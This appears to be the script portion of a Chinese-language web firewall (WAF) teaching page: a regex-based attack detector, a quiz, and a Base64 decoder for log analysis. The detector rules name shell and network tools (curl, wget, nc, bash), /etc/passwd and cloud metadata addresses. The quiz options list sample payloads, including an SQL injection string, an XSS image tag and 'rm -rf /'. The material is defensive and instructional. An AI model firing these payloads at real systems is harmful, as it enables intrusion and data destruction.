            { pattern: /<svg[^>]*onload/i, type: 'XSS', desc: '偵測到 SVG XSS 攻擊' },
            { pattern: /(;|\||&&|\$\(|`)\s*(ls|cat|whoami|id|pwd|wget|curl|bash|sh|nc|netcat)/i, type: 'Command Injection', desc: '偵測到命令注入' },
            { pattern: /(\.\.|%2e%2e|%252e%252e)/i, type: 'Path Traversal', desc: '偵測到路徑穿越' },
            { pattern: /(\/etc\/passwd|\/etc\/shadow|\/windows\/system32)/i, type: 'Path Traversal', desc: '偵測到敏感檔案存取' },
            { pattern: /(127\.0\.0\.1|localhost|169\.254\.169\.254|0\.0\.0\.0)/i, type: 'SSRF', desc: '偵測到內部位址存取' },
        ];

        function checkWAF() {
            const input = document.getElementById('waf-input').value;
            const resultDiv = document.getElementById('waf-result');

            if (!input.trim()) {
                resultDiv.innerHTML = '';
                return;
            }

            let detections = [];

            for (const rule of wafRules) {
                if (rule.pattern.test(input)) {
                    detections.push(rule);
                }
            }

            if (detections.length > 0) {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-blocked">
                        <strong style="color: var(--danger); font-family: 'JetBrains Mono', monospace; font-size: 0.875rem;">[BLOCKED] 請求被阻擋</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">偵測到以下威脅：</p>
                        <ul style="margin-top: 0.5rem; padding-left: 1.5rem; list-style: none;">
                            ${detections.map(d => `<li style="color: var(--danger); font-family: 'JetBrains Mono', monospace; font-size: 0.8125rem; margin-bottom: 0.25rem;"><span style="color: var(--text-dim);">></span> ${d.type}: ${d.desc}</li>`).join('')}
                        </ul>
                    </div>
                `;
            } else {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-allowed">
                        <strong style="color: var(--phosphor); font-family: 'JetBrains Mono', monospace; font-size: 0.875rem;">[ALLOWED] 請求通過</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">未偵測到已知攻擊模式</p>
                    </div>
                `;
            }
        }

        function setPayload(payload) {
            document.getElementById('waf-input').value = payload;
            checkWAF();
        }

        // Setup payload buttons with data attributes
        document.querySelectorAll('[data-payload]').forEach(btn => {
            btn.addEventListener('click', function() {
                setPayload(this.dataset.payload);
            });
        });

        // HTML escape helper function
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        // Quiz System
        const quizQuestions = [
            {
                question: '以下哪個是 SQL Injection 攻擊?',
                code: null,
                options: [
                    "SELECT * FROM users WHERE id=1",
                    "' OR '1'='1",
                    "<script>alert(1)<\/script>",
                    "../../../etc/passwd"
                ],
                correct: 1,
                explanation: "' OR '1'='1 是典型的 SQL 注入 payload，用於繞過認證。"
            },
            {
                question: '以下哪個 payload 嘗試進行 XSS 攻擊?',
                code: null,
                options: [
                    "UNION SELECT password FROM users",
                    "; rm -rf /",
                    "<img src=x onerror=alert(1)>",
                    "http://169.254.169.254/"
                ],
                correct: 2,
                explanation: "<img src=x onerror=alert(1)> 利用圖片載入失敗時觸發 JavaScript，是常見的 XSS 攻擊。"
            },
            {
                question: 'ModSecurity 規則中，哪個階段用於檢查請求主體 (Request Body)?',
                code: null,
                options: [
                    "phase:1",
                    "phase:2",
                    "phase:3",
                    "phase:4"
                ],
                correct: 1,
                explanation: "phase:2 是請求主體階段，用於檢查 POST 資料等請求內容。"
            },
            {
                question: '以下哪種技術不是 WAF 繞過方法?',
                code: null,
                options: [
                    "大小寫變換 (Case Variation)",
                    "URL 編碼 (URL Encoding)",
                    "參數化查詢 (Parameterized Queries)",
                    "註解插入 (Comment Injection)"
                ],
                correct: 2,
                explanation: "參數化查詢是防禦 SQL Injection 的方法，不是繞過 WAF 的技術。"
            },
            {
                question: '偵測到 http://169.254.169.254/latest/meta-data/ 這個請求，最可能是什麼類型的攻擊?',
                code: null,
                options: [
                    "SQL Injection",
                    "XSS",
                    "SSRF (Server-Side Request Forgery)",
                    "Path Traversal"
                ],
                correct: 2,
                explanation: "169.254.169.254 是 AWS EC2 等雲端服務的 metadata endpoint，攻擊者透過 SSRF 嘗試存取雲端實例的敏感資訊。"
            }
        ];

        let currentQuestion = 0;
        let answers = new Array(quizQuestions.length).fill(null);

        function loadQuestion() {
            const question = quizQuestions[currentQuestion];
            const content = document.getElementById('quiz-content');

            let optionsHtml = question.options.map((option, index) => {
                let className = 'quiz-option';
                if (answers[currentQuestion] !== null) {
                    if (index === question.correct) {
                        className += ' correct';
                    } else if (index === answers[currentQuestion] && answers[currentQuestion] !== question.correct) {
                        className += ' incorrect';
                    }
                }
                return `<div class="${className}" onclick="selectAnswer(${index})">${escapeHtml(option)}</div>`;
            }).join('');

            let explanationHtml = '';
            if (answers[currentQuestion] !== null) {
                explanationHtml = `
                    <div class="result-box show ${answers[currentQuestion] === question.correct ? 'result-success' : 'result-error'}">
                        <span style="font-family: 'JetBrains Mono', monospace; font-weight: 600;">${answers[currentQuestion] === question.correct ? '[CORRECT]' : '[INCORRECT]'}</span>
                        ${question.explanation}
                    </div>
                `;
            }

            content.innerHTML = `
                <div class="quiz-question">
                    <h4>問題 ${currentQuestion + 1} / ${quizQuestions.length}</h4>
                    <p style="margin-top: 0.5rem; margin-bottom: 1rem; font-size: 1.1rem;">${question.question}</p>
                    ${question.code ? `<div class="code-block"><code>${question.code}</code></div>` : ''}
                    <div class="quiz-options">
                        ${optionsHtml}
                    </div>
                    ${explanationHtml}
                </div>
            `;

            // Update navigation buttons
            document.getElementById('prev-btn').disabled = currentQuestion === 0;
            document.getElementById('next-btn').textContent =
                currentQuestion === quizQuestions.length - 1 ? '完成' : '下一題';

            updateProgress();
        }

        function selectAnswer(index) {
            if (answers[currentQuestion] !== null) return; // Already answered

            answers[currentQuestion] = index;
            loadQuestion();
        }

        function nextQuestion() {
            if (currentQuestion < quizQuestions.length - 1) {
                currentQuestion++;
                loadQuestion();
            } else {
                showResults();
            }
        }

        function prevQuestion() {
            if (currentQuestion > 0) {
                currentQuestion--;
                loadQuestion();
            }
        }

        function updateProgress() {
            const answered = answers.filter(a => a !== null).length;
            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;

            document.getElementById('quiz-progress').style.width =
                `${(answered / quizQuestions.length) * 100}%`;
            document.getElementById('quiz-score').textContent =
                `${correct} / ${quizQuestions.length}`;
        }

        function showResults() {
            const correct = answers.filter((a, i) => a === quizQuestions[i].correct).length;
            const total = quizQuestions.length;
            const percentage = Math.round((correct / total) * 100);

            let message = '';
            let statusClass = '';
            if (percentage >= 80) {
                message = '你對 WAF 有很好的理解！';
                statusClass = 'color: var(--phosphor);';
            } else if (percentage >= 60) {
                message = '不錯！繼續學習可以更上一層樓！';
                statusClass = 'color: var(--amber);';
            } else {
                message = '建議再複習一下上面的內容！';
                statusClass = 'color: var(--danger);';
            }

            document.getElementById('quiz-content').innerHTML = `
                <div style="text-align: center; padding: 2rem;">
                    <h3 style="font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; color: var(--text-dim); margin-bottom: 1rem; text-transform: uppercase; letter-spacing: 0.1em;">// QUIZ_COMPLETE</h3>
                    <p style="font-family: 'JetBrains Mono', monospace; font-size: 4rem; margin-bottom: 1rem; ${statusClass}">${percentage}%</p>
                    <p style="font-family: 'JetBrains Mono', monospace; color: var(--text-secondary); margin-bottom: 1rem; font-size: 0.875rem;">
                        正確: ${correct} / ${total}
                    </p>
                    <p style="font-size: 1rem; color: var(--text-primary);">${message}</p>
                    <button class="btn btn-primary" onclick="resetQuiz()" style="margin-top: 1.5rem;">
                        $ ./retry
                    </button>
                </div>
            `;
        }

        function resetQuiz() {
            currentQuestion = 0;
            answers = new Array(quizQuestions.length).fill(null);
            loadQuestion();
        }

        // Smooth scroll
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Initialize quiz
        loadQuestion();

        // Base64 Decoder for WAF Log Analysis
        function decodeBase64() {
            const input = document.getElementById('base64-input').value.trim();
            const resultDiv = document.getElementById('base64-result');

            if (!input) {
                resultDiv.innerHTML = '';
                return;
            }

            try {
                // Handle URL-safe Base64
                let normalizedInput = input.replace(/-/g, '+').replace(/_/g, '/');
                // Add padding if needed
                while (normalizedInput.length % 4) {
                    normalizedInput += '=';
                }

                const decoded = atob(normalizedInput);
                // Try to detect if it's valid UTF-8 text
                const utf8Decoded = decodeURIComponent(escape(decoded));

                resultDiv.innerHTML = `
                    <div class="detection-result detection-allowed">
                        <strong style="color: var(--phosphor); font-family: 'JetBrains Mono', monospace; font-size: 0.875rem;">[DECODED] 解碼成功</strong>
                        <pre style="margin-top: 0.75rem; color: var(--text-primary); font-family: 'JetBrains Mono', monospace; font-size: 0.8125rem; white-space: pre-wrap; word-break: break-all; line-height: 1.6;">${escapeHtml(utf8Decoded)}</pre>
                    </div>
                `;
            } catch (e) {
                resultDiv.innerHTML = `
                    <div class="detection-result detection-blocked">
                        <strong style="color: var(--danger); font-family: 'JetBrains Mono', monospace; font-size: 0.875rem;">[ERROR] 解碼失敗</strong>
                        <p style="margin-top: 0.5rem; color: var(--text-secondary); font-size: 0.875rem;">無效的 Base64 字串或包含非文字內容</p>
                        <p style="margin-top: 0.25rem; color: var(--text-dim); font-size: 0.75rem;">${escapeHtml(e.message)}</p>
                    </div>
                `;
            }
        }

        function setBase64(value) {
            document.getElementById('base64-input').value = value;
            decodeBase64();
        }

        // Allow Enter key to trigger decode
        document.getElementById('base64-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                decodeBase64();
            }
        });

        // Add scroll animation
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.classList.add('animate-in');
                }
            });
        }, { threshold: 0.1 });

        document.querySelectorAll('.card, .accordion, .rule-demo, .quiz-container').forEach(el => {
            observer.observe(el);
        });
    </script>
</body>
</html>
